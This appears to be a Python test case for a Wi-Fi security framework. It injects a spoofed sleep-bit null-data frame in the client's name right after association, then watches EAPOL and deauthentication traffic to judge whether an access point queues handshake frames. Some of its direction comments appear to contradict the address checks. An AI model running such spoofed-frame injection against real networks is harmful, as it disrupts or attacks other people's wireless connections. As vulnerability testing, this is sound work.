# test_queue_4way_sleep_early.py
from dependencies.libwifi.wifi import *
from library.testcase import Trigger, Action, Test


class Queue4WaySleepEarly(Test):
	"""
	Inject a spoofed null-data (sleep-bit) as early as possible after association,
	passively listen for AP->client EAPOL and client deauth, and wait longer
	for handshake timeouts.
	"""
	name = "queue-4way-sleep"
	kind = Test.Supplicant

	def __init__(self):
		super().__init__([
			# 0: spoofed null-data (sleep bit) — try to trigger on association if supported
			Action(trigger=Trigger.Associated if hasattr(Trigger, "Associated")
			       else Trigger.Connected, action=Action.Inject),
			# 1: listen for EAPOL (AP->client) on-air (passive)
			Action(trigger=Trigger.Connected, action=Action.Receive),
			# 2: listen for Deauthentication frames (passive)
			Action(trigger=Trigger.Connected, action=Action.Receive),
			# 3: terminate after observation window
			Action(trigger=Trigger.Connected, action=Action.Terminate)
		])

		self.eapol_seen = False
		self.client_deauth_seen = False
		self.null_injected = False

	def receive(self, station, frame):
		if not frame.haslayer(Dot11):
			return False

		# filter to relevant frames
		addr1 = frame[Dot11].addr1
		addr2 = frame[Dot11].addr2
		if addr1 not in (station.mac, station.bss) and addr2 not in (station.mac, station.bss):
			return False

		# AP->client EAPOL observed
		if frame.haslayer(EAPOL) and frame[Dot11].addr1 == station.mac and frame[Dot11].addr2 == station.bss:
			log(STATUS, "Observed AP->client EAPOL on-air: %s" %
			    frame.summary(), color="green")
			self.eapol_seen = True
			return True

		# Deauthentication frames
		if frame.haslayer(Dot11Deauth):
			# client->AP deauth
			if frame[Dot11].addr2 == station.bss and frame[Dot11].addr1 == station.mac:
				log(STATUS, "Client->AP deauth observed: %s" %
				    frame.summary(), color="orange")
				self.client_deauth_seen = True
				if not self.eapol_seen:
					log(STATUS, "Heuristic: client deauth without observed AP->client EAPOL -> AP LIKELY VULNERABLE", color="red")
				else:
					log(STATUS, "Client deauth observed but AP->client EAPOL was seen -> ambiguous", color="yellow")
				return True
			# AP->client deauth on-air
			if frame[Dot11].addr2 == station.mac and frame[Dot11].addr1 == station.bss:
				log(STATUS, "AP->client deauth observed on-air: %s" %
				    frame.summary(), color="blue")
				return True

		return False

	def generate(self, station):
		# Spoofed NULL-DATA with sleep-bit (from client -> AP)
		null_frame = Dot11(type="Data", subtype=4, addr1=station.bss,
		                   addr2=station.mac, addr3=station.bss)
		null_frame.FCfield |= Dot11(FCfield="pw-mgt").FCfield

		# If we were triggered on Association, schedule with minimal delay; otherwise small delay after Connected
		# Very small delay to beat AP's first EAPOL (tune as necessary)
		delay_for_inject = 0.05  # 50 ms; raise to 0.1 if unreliable on your hardware
		self.actions[0].set_frame(null_frame, mon=True, encrypt=False)
		self.actions[0].set_delay(delay=delay_for_inject)
		self.null_injected = True
		log(DEBUG, "Scheduled spoofed null-data (sleep-bit) after %.3fs" %
		    delay_for_inject, color="cyan")

		# Passive receives
		self.actions[1].set_receive(self.receive, mon=True)
		self.actions[2].set_receive(self.receive, mon=True)

		# Terminate after extended observation window to allow handshake timeouts
		self.actions[3].set_delay(delay=18)
		log(STATUS, "Test scheduled. Observation window set to 18s. CLEAR PMKSA cache BEFORE running this test.", color="green")


# NOTES
# jest problem z psk cachem? handshake zawiazuje sie istant i skrypt nie zdaza zinjectowac ramki przed EAPOL - do analizy